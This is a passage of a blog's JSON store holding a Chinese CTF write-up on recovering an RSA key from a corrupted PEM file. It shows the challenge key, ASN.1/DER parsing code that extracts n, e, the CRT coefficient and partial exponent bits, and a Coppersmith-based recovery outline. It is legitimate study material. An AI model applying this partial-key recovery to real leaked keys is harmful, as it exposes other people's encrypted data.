- 134 号位的数据得到的也是 $n$ ，那么问题来了， 3 - 6 号位这 4 个字节里放了啥？\n\n以下是新List：\n\n```plain\n\\x02\\x01\\x00\\x02\\x81\\x81\\x00\\xd7\\x15%\\x06\\xaa\\x9c...\n```\n\n这里涉及一个**ASN.1**（Abstract Syntax Notation dot one，即抽象记法1）的问题，简单来说就是将数据编码成 3 个部分：**标志域、长度域、值域**\n标志域中，约定 02 表示整数\n长度域稍微复杂些，记录的是值域的长度，分为定长和不定长两种情况\n定长时，若值域长度不超过 127 ，则用**短格式**表示，也就是直接用 16 进制表示，比如长度为 31 就是 0x1F ，即 0001 1111 ；若长度超过 127 ，则用**长格式**表示，首字节的首位置 1 表示长格式，后面7位则表示后面再跟多少个表示长度的字节，比如 1000 0001 表示后面 1 个字节表示长度，后面的长度也是直接用 16 进制表示。\n现在可以看到新 List 中， 0 号位为 02 表示整数， 1 号位 01 表示长度为 1 ， 2 号位 00 表示数据为 0 ，这就是上面提到的私钥文件结构中的那个 0 。\n再继续分析， 3 号位 02 表示数据为整数， 4 号位中的首比特为1表示使用长格式，后面 7 个比特为 000 0001 意为数据长度用 1 个字节表示，没错就是后面紧跟的 5 号位，表示数据长度为 0x81 ，转换成 10 进制就是 129 ，试了一下 6 - 134 号位用 `bytes_to_long` 解析出来的数据，也是 $n$\n那么现在你应该也可以尝试写出 $e$ 的编码：\n\n```plain\n\\x02\\x03\\x01\\x00\\x01\n```\n\n细心的你还发现我开头扔了 4 个字节，猜猜是啥呢？\n答案是整个私钥文件编码后作为值域前面补的标签域和长度域，最前面再补一个 0 ，也就是\n\n```plain\n0\\x82\\x02^\n```\n\n后两个字节 `bytes_to_long` 解码后是 606 ，恰为后面跟的完整数据的长度\n\n> 后来偶然间发现竟然有类似的题目（）\n[0CTF 2016 Quals equation](https://ctftime.org/task/2127)\n\n## 参考\n\n<https://mp.weixin.qq.com/s/A9OmgHAmGLJPEL4cQBU8zQ>\n<https://www.likecs.com/show-40060.html>\n","source":"_posts/2022 蓝帽杯 - corrupted_key.md","raw":"---\ntitle: 2022 蓝帽杯 - corrupted_key\ndate: 2022-07-16 13:08:00\ntags: [CTF, Crypto]\ncategories: 题解\n---\n\n很有意思的一道题，涉及私钥文件的结构。\n<!--more-->\n********************************\n\n## 题目\n\n给了一个 `priv.pem`\n\n```plain\n-----BEGIN RSA PRIVATE KEY-----\nMIICXgIBAAKBgQDXFSUGqpzsBeUzXWtG9UkUB8MZn9UQkfH2Aw03YrngP0nJ3NwH\nUFTgzBSLl0tBhUvZO07haiqHbuYgBegO+Aa3qjtksb+bH6dz41PQzbn/l4Pd1fXm\ndJmtEPNh6TjQC4KmpMQqBTXF52cheY6GtFzUuNA7DX51wr6HZqHoQ73GQQIDAQAB\n\n\n\n\n\n\n\n\nyQvOzxy6szWFheigQdGxAkEA4wFss2CcHWQ8FnQ5w7k4uIH0I38khg07HLhaYm1c\nzUcmlk4PgnDWxN+ev+vMU45O5eGntzaO3lHsaukX9461mA==\n-----END RSA PRIVATE KEY-----\n```\n\n和一个加密的脚本\n\n```python\nfrom Crypto.PublicKey import RSA\nfrom Crypto.Cipher import PKCS1_OAEP\nfrom secret import flag\n\nkey = RSA.generate(1024)\nopen(\"flag.enc\",'wb').write(PKCS1_OAEP.new(key.publickey()).encrypt(flag))\nopen('priv.pem','wb').write(key.exportKey('PEM'))\n```\n\n然后就是 `flag.enc`\n\n## 分析\n\n### 数理部分\n\n题目名为 **corrupted_key** ，意为残损的私钥文件，既然是残损的，那么剩下的部分就是解题的关键了。\n通过查看 `Crypto.PublicKey.RSA` 的源码，发现私钥文件的结构是：\n\n```plain\n0 （注意！！！！）\nn\ne\np\nq\nd mod (p-1)\nd mod (q-1)\n(inverse of q) mod p\n```\n\n完整来说是\n\n```plain\nRSAPrivateKey ::= SEQUENCE {\nversion Version,\nmodulus INTEGER, -- n\npublicExponent INTEGER, -- e\nprivateExponent INTEGER, -- d\nprime1 INTEGER, -- p\nprime2 INTEGER, -- q\nexponent1 INTEGER, -- d mod (p-1)\nexponent2 INTEGER, -- d mod (q-1)\ncoefficient INTEGER, -- (inverse of q) mod p\notherPrimeInfos OtherPrimeInfos OPTIONAL\n}\n```\n\n一通操作后发现可以拿到 $n$,$e$,CRT 系数（即 $q^{-1}\\mod p$ ）和 $d_q$ 低位，至于怎么拿到的等下再说，这里可以构造等式如下：\n$$\n    t = q^{-1} \\pmod p \\\\\\\\\n    tq-1 = 0 \\pmod p \\\\\\\\\n    tq^2 - q = 0 \\pmod n\n$$\n然后\n$$\n    ed_q = 1 \\pmod{q-1} \\\\\\\\\n    ed_q - 1 = k(q - 1) \\\\\\\\\n    f = (dq_h + dq_l)e - 1 + k = kq\n$$\n代入得\n$$\n    tf^2 - kf = 0 \\pmod n\n$$\n显然 $k$ 和 $e$ 数量级是相当的， $dq_h$ 的未知高位有512-120=392位，就可以通过 coppersmith 爆破 $k$ 。\n\n### 参数提取\n\n然后就是有意思的部分了，如何从残损的私钥文件中提取参数呢？\n对着源码一顿调试了几个钟（太菜了呜呜），发现是先将各个参数塞进一个首位为 0 的数组，然后各个参数前面补上长度，后面 `long_to_bytes` 转换成 bytes ，最后拼接起来。\n我的提取脚本如下：\n\n```python\nfrom binascii import a2b_base64\nfrom Crypto.Util.asn1 import DerInteger\nfrom Crypto.Util.number import *\npem = '''-----BEGIN RSA PRIVATE KEY-----\nMIICXgIBAAKBgQDXFSUGqpzsBeUzXWtG9UkUB8MZn9UQkfH2Aw03YrngP0nJ3NwH\nUFTgzBSLl0tBhUvZO07haiqHbuYgBegO+Aa3qjtksb+bH6dz41PQzbn/l4Pd1fXm\ndJmtEPNh6TjQC4KmpMQqBTXF52cheY6GtFzUuNA7DX51wr6HZqHoQ73GQQIDAQAB\n\nyQvOzxy6szWFheigQdGxAkEA4wFss2CcHWQ8FnQ5w7k4uIH0I38khg07HLhaYm1c\nzUcmlk4PgnDWxN+ev+vMU45O5eGntzaO3lHsaukX9461mA==\n-----END RSA PRIVATE KEY-----'''\n\npemlist = pem.split('\\n')\ndecode_b64 = b''\nfor i in pemlist[1:-1]:\n    decode_b64+=a2b_base64(i)\ndecode_b64 = decode_b64[4:] # 丢弃前4个字节\n\nder_int = DerInteger()\n\n# 提取n\nn = decode_b64[3:135]\nder_int.decode(n)\nprint('[+] n =',n:=der_int.value)\n\n# 提取e\ne = decode_b64[135:140]\nder_int.decode(e)\nprint('[+] e =',e:=der_int.value)\n\n# 提取CRT系数\nfor len in range(1,300):\n    try:\n        q_inv_p = decode_b64[-len:]\n        der_int.decode(q_inv_p)\n        print('[+] q_inv_p =',q_inv_p:=der_int.value)\n    except:\n        len+=1\n    else:\n        # print(len)    # 67\n        break\n# print(q_inv_p.bit_length())   # 512\n\n# 提取dp低位\ndp_l = decode_b64[-82:-67]\n# print(dp_l)\nprint('[+] dp_l =',bytes_to_long(dp_l))\n```\n\n可以看到我一开始直接把前 4 个字节丢了，然后在新 List 里用库函数解析 3 - 134 号位的数据，这部分就是属于 $n$ 的，然而实际上 `bytes_to_long` 解析 7 - 134 号位的数据得到的也是 $n$ ，那么问题来了， 3 - 6 号位这 4 个字节里放了啥？\n\n以下是新List：\n\n```plain\n\\x02\\x01\\x00\\x02\\x81\\x81\\x00\\xd7\\x15%\\x06\\xaa\\x9c...\n```\n\n这里涉及一个**ASN.1**（Abstract Syntax Notation dot one，即抽象记法1）的问题，简单来说就是将数据编码成 3 个部分：**标志域、长度域、值域**\n标志域中，约定 02 表示整数\n长度域稍微复杂些，记录的是值域的长度，分为定长和不定长两种情况\n定长时，若值域长度不超过 127 ，则用**短格式**表示，也就是直接用 16 进制表示，比如长度为 31 就是 0x1F ，即 0001 1111 ；若长度超过 127 ，则用**长格式**表示，首字节的首位置 1 表示长格式，后面7位则表示后面再跟多少个表示长度的字节，比如 1000 0001 表示后面 1 个字节表示长度，后面的长度也是直接用 16 进制表示。\n现在可以看到新 List 中， 0 号位为 02 表示整数， 1 号位 01 表示长度为 1 ， 2 号位 00 表示数据为 0 ，这就是上面提到的私钥文件结构中的那个 0 。\n再继续分析， 3 号位 02 表示数据为整数， 4 号位中的首比特为1表示使用长格式，后面 7 个比特为 000 0001 意为数据长度用 1 个字节表示，没错就是后面紧跟的 5 号位，表示数据长度为 0x81 ，转换成 10 进制就是 129 ，试了一下 6 - 134 号位用 `bytes_to_long` 解析出来的数据，也是 $n$\n那么现在你应该也可以尝试写出 $e$ 的编码：\n\n```plain\n\\x02\\x03\\x01\\x00\\x01\n```\n\n细心的你还发现我开头扔了 4 个字节，猜猜是啥呢？\n答案是整个私钥文件编码后作为值域前面补的标签域和长度域，最前面再补一个 0 ，也就是\n\n```plain\n0\\x82\\x02^\n```\n\n后两个字节 `bytes_to_long` 解码后是 606 ，恰为后面跟的完整数据的长度\n\n> 后来偶然间发现竟然有类似的题目（）\n[0CTF 2016 Quals equation](https://ctftime.org/task/2127)\n\n## 参考\n\n<https://mp.weixin.qq.com/s/A9OmgHAmGLJPEL4cQBU8zQ>\n<https://www.likecs.com/show-40060.html>\n","slug":"2022 蓝帽杯 - corrupted_key","published":1,"updated":"2024-06-05T07:52:31.968Z","comments":1,"layout":"post","photos":[],"_id":"clxa5zoct00047slz3ugk88rm","content":"<p>很有意思的一道题，涉及私钥文件的结构。</p>\n<span id=\"more\"></span>\n<hr>\n<h2 id=\"题目\"><a href=\"#题目\" class=\"headerlink\" title=\"题目\"></a>题目</h2><p>给了一个 <code>priv.pem</code></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">-----BEGIN RSA PRIVATE KEY-----</span><br><span class=\"line\">MIICXgIBAAKBgQDXFSUGqpzsBeUzXWtG9UkUB8MZn9UQkfH2Aw03YrngP0nJ3NwH</span><br><span class=\"line\">UFTgzBSLl0tBhUvZO07haiqHbuYgBegO+Aa3qjtksb+bH6dz41PQzbn/l4Pd1fXm</span><br><span class=\"line\">dJmtEPNh6TjQC4KmpMQqBTXF52cheY6GtFzUuNA7DX51wr6HZqHoQ73GQQIDAQAB</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">yQvOzxy6szWFheigQdGxAkEA4wFss2CcHWQ8FnQ5w7k4uIH0I38khg07HLhaYm1c</span><br><span class=\"line\">zUcmlk4PgnDWxN+ev+vMU45O5eGntzaO3lHsaukX9461mA==</span><br><span class=\"line\">-----END RSA PRIVATE KEY-----</span><br></pre></td></tr></table></figure>\n\n<p>和一个加密的脚本</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> Crypto.PublicKey <span class=\"keyword\">import</span> RSA</span><br><span class=\"line\"><span class=\"keyword\">from</span> Crypto.Cipher <span class=\"keyword\">import</span> PKCS1_OAEP</span><br><span class=\"line\"><span class=\"keyword\">from</span> secret <span class=\"keyword\">import</span> flag</span><br><span class=\"line\"></span><br><span class=\"line\">key = RSA.generate(<span class=\"number\">1024</span>)</span><br><span class=\"line\"><span class=\"built_in\">open</span>(<span class=\"string\">&quot;flag.enc&quot;</span>,<span class=\"string\">&#x27;wb&#x27;</span>).write(PKCS1_OAEP.new(key.publickey()).encrypt(flag))</span><br><span class=\"line\"><span class=\"built_in\">open</span>(<span class=\"string\">&#x27;priv.pem&#x27;</span>,<span class=\"string\">&#x27;wb&#x27;</span>).write(key.exportKey(<span class=\"string\">&#x27;PEM&#x27;</span>))</span><br></pre></td></tr></table></figure>\n\n<p>然后就是 <code>flag.enc</code></p>\n<h2 id=\"分析\"><a href=\"#分析\" class=\"headerlink\" title=\"分析\"></a>分析</h2><h3 id=\"数理部分\"><a href=\"#数理部分\" class=\"headerlink\" title=\"数理部分\"></a>数理部分</h3><p>题目名为 <strong>corrupted_key</strong> ，意为残损的私钥文件，既然是残损的，那么剩下的部分就是解题的关键了。<br>通过查看 <code>Crypto.PublicKey.RSA</code> 的源码，发现私钥文件的结构是：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0 （注意！！！！）</span><br><span class=\"line\">n</span><br><span class=\"line\">e</span><br><span class=\"line\">p</span><br><span class=\"line\">q</span><br><span class=\"line\">d mod (p-1)</span><br><span class=\"line\">d mod (q-1)</span><br><span class=\"line\">(inverse of q) mod p</span><br></pre></td></tr></table></figure>\n\n<p>完整来说是</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">RSAPrivateKey ::= SEQUENCE &#123;</span><br><span class=\"line\">version Version,</span><br><span class=\"line\">modulus INTEGER, -- n</span><br><span class=\"line\">publicExponent INTEGER, -- e</span><br><span class=\"line\">privateExponent INTEGER, -- d</span><br><span class=\"line\">prime1 INTEGER, -- p</span><br><span class=\"line\">prime2 INTEGER, -- q</span><br><span class=\"line\">exponent1 INTEGER, -- d mod (p-1)</span><br><span class=\"line\">exponent2 INTEGER, -- d mod (q-1)</span><br><span class=\"line\">coefficient INTEGER, -- (inverse of q) mod p</span><br><span class=\"line\">otherPrimeInfos OtherPrimeInfos OPTIONAL</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>一通操作后发现可以拿到 $n$,$e$,CRT 系数（即 $q^{-1}\\mod p$ ）和 $d_q$ 低位，至于怎么拿到的等下再说，这里可以构造等式如下：<br>$$<br>    t = q^{-1} \\pmod p \\\\<br>    tq-1 = 0 \\pmod p \\\\<br>    tq^2 - q = 0 \\pmod n<br>$$<br>然后<br>$$<br>    ed_q = 1 \\pmod{q-1} \\\\<br>    ed_q - 1 = k(q - 1) \\\\<br>    f = (dq_h + dq_l)e - 1 + k = kq<br>$$<br>代入得<br>$$<br>    tf^2 - kf = 0 \\pmod n<br>$$<br>显然 $k$ 和 $e$ 数量级是相当的， $dq_h$ 的未知高位有512-120=392位，就可以通过 coppersmith 爆破 $k$ 。</p>\n<h3 id=\"参数提取\"><a href=\"#参数提取\" class=\"headerlink\" title=\"参数提取\"></a>参数提取</h3><p>然后就是有意思的部分了，如何从残损的私钥文件中提取参数呢？<br>对着源码一顿调试了几个钟（太菜了呜呜），发现是先将各个参数塞进一个首位为 0 的数组，然后各个参数前面补上长度，后面 <code>long_to_bytes</code> 转换成 bytes ，最后拼接起来。<br>我的提取脚本如下：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> binascii <span class=\"keyword\">import</span> a2b_base64</span><br><span class=\"line\"><span class=\"keyword\">from</span> Crypto.Util.asn1 <span class=\"keyword\">import</span> DerInteger</span><br><span class=\"line\"><span class=\"keyword\">from</span> Crypto.Util.number <span class=\"keyword\">import</span> *</span><br><span class=\"line\">pem = <span class=\"string\">&#x27;&#x27;&#x27;-----BEGIN RSA PRIVATE KEY-----</span></span><br><span class=\"line\"><span class=\"string\">MIICXgIBAAKBgQDXFSUGqpzsBeUzXWtG9UkUB8MZn9UQkfH2Aw03YrngP0nJ3NwH</span></span><br><span class=\"line\"><span class=\"string\">UFTgzBSLl0tBhUvZO07haiqHbuYgBegO+Aa3qjtksb+bH6dz41PQzbn/l4Pd1fXm</span></span><br><span class=\"line\"><span class=\"string\">dJmtEPNh6TjQC4KmpMQqBTXF52cheY6GtFzUuNA7DX51wr6HZqHoQ73GQQIDAQAB</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">yQvOzxy6szWFheigQdGxAkEA4wFss2CcHWQ8FnQ5w7k4uIH0I38khg07HLhaYm1c</span></span><br><span class=\"line\"><span class=\"string\">zUcmlk4PgnDWxN+ev+vMU45O5eGntzaO3lHsaukX9461mA==</span></span><br><span class=\"line\"><span class=\"string\">-----END RSA PRIVATE KEY-----&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">pemlist = pem.split(<span class=\"string\">&#x27;\\n&#x27;</span>)</span><br><span class=\"line\">decode_b64 = <span class=\"string\">b&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> pemlist[<span class=\"number\">1</span>:-<span class=\"number\">1</span>]:</span><br><span class=\"line\">    decode_b64+=a2b_base64(i)</span><br><span class=\"line\">decode_b64 = decode_b64[<span class=\"number\">4</span>:] <span class=\"comment\"># 丢弃前4个字节</span></span><br><span class=\"line\"></span><br><span class=\"line\">der_int = DerInteger()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 提取n</span></span><br><span class=\"line\">n = decode_b64[<span class=\"number\">3</span>:<span class=\"number\">135</span>]</span><br><span class=\"line\">der_int.decode(n)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&#x27;[+] n =&#x27;</span>,n:=der_int.value)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 提取e</span></span><br><span class=\"line\">e = decode_b64[<span class=\"number\">135</span>:<span class=\"number\">140</span>]</span><br><span class=\"line\">der_int.decode(e)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&#x27;[+] e =&#x27;</span>,e:=der_int.value)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 提取CRT系数</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> <span class=\"built_in\">len</span> <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>,<span class=\"number\">300</span>):</span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        q_inv_p = decode_b64[-<span class=\"built_in\">len</span>:]</span><br><span class=\"line\">        der_int.decode(q_inv_p)</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;[+] q_inv_p =&#x27;</span>,q_inv_p:=der_int.value)</span><br><span class=\"line\">    <span class=\"keyword\">except</span>:</span><br><span class=\"line\">        <span class=\"built_in\">len</span>+=<span class=\"number\">1</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"comment\"># print(len)    # 67</span></span><br><span class=\"line\">        <span class=\"keyword\">break</span></span><br><span class=\"line\"><span class=\"comment\"># print(q_inv_p.bit_length())   # 512</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 提取dp低位</span></span><br><span class=\"line\">dp_l = decode_b64[-<span class=\"number\">82</span>:-<span class=\"number\">67</span>]</span><br><span class=\"line\"><span class=\"comment\"># print(dp_l)</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&#x27;[+] dp_l =&#x27;</span>,bytes_to_long(dp_l))</span><br></pre></td></tr></table></figure>\n\n<p>可以看到我一开始直接把前 4 个字节丢了，然后在新 List 里用库函数解析 3 - 134 号位的数据，这部分就是属于 $n$ 的，然而实际上 <code>bytes_to_long</code> 解析 7 - 134 号位的数据得到的也是 $n$ ，那么问题来了， 3 - 6 号位这 4 个字节里放了啥？</p>\n<p>以下是新List：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">\\x02\\x01\\x00\\x02\\x81\\x81\\x00\\xd7\\x15%\\x06\\xaa\\x9c...</span><br></pre></td></tr></table></figure>\n\n<p>这里涉及一个<strong>ASN.1</strong>（Abstract Syntax Notation dot one，即抽象记法1）的问题，简单来说就是将数据编码成 3 个部分：<strong>标志域、长度域、值域</strong><br>标志域中，约定 02 表示整数<br>长度域稍微复杂些，记录的是值域的长度，分为定长和不定长两种情况<br>定长时，若值域长度不超过 127 ，则用<strong>短格式</strong>表示，也就是直接用 16 进制表示，比如长度为 31 就是 0x1F ，即 0001 1111 ；若长度超过 127 ，则用<strong>长格式</strong>表示，首字节的首位置 1 表示长格式，后面7位则表示后面再跟多少个表示长度的字节，比如 1000 0001 表示后面 1 个字节表示长度，后面的长度也是直接用 16 进制表示。<br>现在可以看到新 List 中， 0 号位为 02 表示整数， 1 号位 01 表示长度为 1 ， 2 号位 00 表示数据为 0 ，这就是上面提到的私钥文件结构中的那个 0 。<br>再继续分析， 3 号位 02 表示数据为整数， 4 号位中的首比特为1表示使用长格式，后面 7 个比特为 000 0001 意为数据长度用 1 个字节表示，没错就是后面紧跟的 5 号位，表示数据长度为 0x81 ，转换成 10 进制就是 129 ，试了一下 6 - 134 号位用 <code>bytes_to_long</code> 解析出来的数据，也是 $n$<br>那么现在你应该也可以尝试写出 $e$ 的编码：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">\\x02\\x03\\x01\\x00\\x01</span><br></pre></td></tr></table></figure>\n\n<p>细心的你还发现我开头扔了 4 个字节，猜猜是啥呢？<br>答案是整个私钥文件编码后作为值域前面补的标签域和长度域，最前面再补一个 0 ，也就是</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0\\x82\\x02^</span><br></pre></td></tr></table></figure>\n\n<p>后两个字节 <code>bytes_to_long</code> 解码后是 606 ，恰为后面跟的完整数据的长度</p>\n<blockquote>\n<p>后来偶然间发现竟然有类似的题目（）<br><a href=\"https://ctftime.org/task/2127\">0CTF 2016 Quals equation</a></p>\n</blockquote>\n<h2 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h2><p><a href=\"https://mp.weixin.qq.com/s/A9OmgHAmGLJPEL4cQBU8zQ\">https://mp.weixin.qq.com/s/A9OmgHAmGLJPEL4cQBU8zQ</a><br><a href=\"https://www.likecs.com/show-40060.html\">https://www.likecs.com/show-40060.html</a></p>\n","excerpt":"<p>很有意思的一道题，涉及私钥文件的结构。</p>","more":"<hr>\n<h2 id=\"题目\"><a href=\"#题目\" class=\"headerlink\" title=\"题目\"></a>题目</h2><p>给了一个 <code>priv.pem</code></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">-----BEGIN RSA PRIVATE KEY-----</span><br><span class=\"line\">MIICXgIBAAKBgQDXFSUGqpzsBeUzXWtG9UkUB8MZn9UQkfH2Aw03YrngP0nJ3NwH</span><br><span class=\"line\">UFTgzBSLl0tBhUvZO07haiqHbuYgBegO+Aa3qjtksb+bH6dz41PQzbn/l4Pd1fXm</span><br><span class=\"line\">dJmtEPNh6TjQC4KmpMQqBTXF52cheY6GtFzUuNA7DX51wr6HZqHoQ73GQQIDAQAB</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">yQvOzxy6szWFheigQdGxAkEA4wFss2CcHWQ8FnQ5w7k4uIH0I38khg07HLhaYm1c</span><br><span class=\"line\">zUcmlk4PgnDWxN+ev+vMU45O5eGntzaO3lHsaukX9461mA==</span><br><span class=\"line\">-----END RSA PRIVATE KEY-----</span><br></pre></td></tr></table></figure>\n\n<p>和一个加密的脚本</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> Crypto.PublicKey <span class=\"keyword\">import</span> RSA</span><br><span class=\"line\"><span class=\"keyword\">from</span> Crypto.Cipher <span class=\"keyword\">import</span> PKCS1_OAEP</span><br><span class=\"line\"><span class=\"keyword\">from</span> secret <span class=\"keyword\">import</span> flag</span><br><span class=\"line\"></span><br><span class=\"line\">key = RSA.generate(<span class=\"number\">1024</span>)</span><br><span class=\"line\"><span class=\"built_in\">open</span>(<span class=\"string\">&quot;flag.enc&quot;</span>,<span class=\"string\">&#x27;wb&#x27;</span>).write(PKCS1_OAEP.new(key.publickey()).encrypt(flag))</span><br><span class=\"line\"><span class=\"built_in\">open</span>(<span class=\"string\">&#x27;priv.pem&#x27;</span>,<span class=\"string\">&#x27;wb&#x27;</span>).write(key.exportKey(<span class=\"string\">&#x27;PEM&#x27;</span>))</span><br></pre></td></tr></table></figure>\n\n<p>然后就是 <code>flag.enc</code></p>\n<h2 id=\"分析\"><a href=\"#分析\" class=\"headerlink\" title=\"分析\"></a>分析</h2><h3 id=\"数理部分\"><a href=\"#数理部分\" class=\"headerlink\" title=\"数理部分\"></a>数理部分</h3><p>题目名为 <strong>corrupted_key</strong> ，意为残损的私钥文件，既然是残损的，那么剩下的部分就是解题的关键了。<br>通过查看 <code>Crypto.PublicKey.RSA</code> 的源码，发现私钥文件的结构是：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0 （注意！！！！）</span><br><span class=\"line\">n</span><br><span class=\"line\">e</span><br><span class=\"line\">p</span><br><span class=\"line\">q</span><br><span class=\"line\">d mod (p-1)</span><br><span class=\"line\">d mod (q-1)</span><br><span class=\"line\">(inverse of q) mod p</span><br></pre></td></tr></table></figure>\n\n<p>完整来说是</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">RSAPrivateKey ::= SEQUENCE &#123;</span><br><span class=\"line\">version Version,</span><br><span class=\"line\">modulus INTEGER, -- n</span><br><span class=\"line\">publicExponent INTEGER, -- e</span><br><span class=\"line\">privateExponent INTEGER, -- d</span><br><span class=\"line\">prime1 INTEGER, -- p</span><br><span class=\"line\">prime2 INTEGER, -- q</span><br><span class=\"line\">exponent1 INTEGER, -- d mod (p-1)</span><br><span class=\"line\">exponent2 INTEGER, -- d mod (q-1)</span><br><span class=\"line\">coefficient INTEGER, -- (inverse of q) mod p</span><br><span class=\"line\">otherPrimeInfos 